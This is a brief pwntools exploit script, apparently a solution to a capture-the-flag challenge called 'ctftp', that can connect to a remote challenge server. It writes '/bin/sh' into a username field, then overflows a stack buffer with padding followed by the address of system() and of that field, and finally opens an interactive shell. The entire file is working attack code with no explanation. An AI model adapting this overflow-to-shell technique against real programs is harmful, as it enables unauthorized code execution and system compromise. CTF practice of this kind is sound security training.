from pwn import *

e = ELF("./ctftp")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chal.tuctf.com", 30500)
else:
  p = process(e.path)

p.sendlineafter(":", "/bin/sh")
p.sendlineafter(">", "2")
p.sendlineafter(":", "A" * 72 + "A" * 4 + p32(e.symbols["system"]) + p32(0) + p32(e.symbols["username"]))


p.interactive()
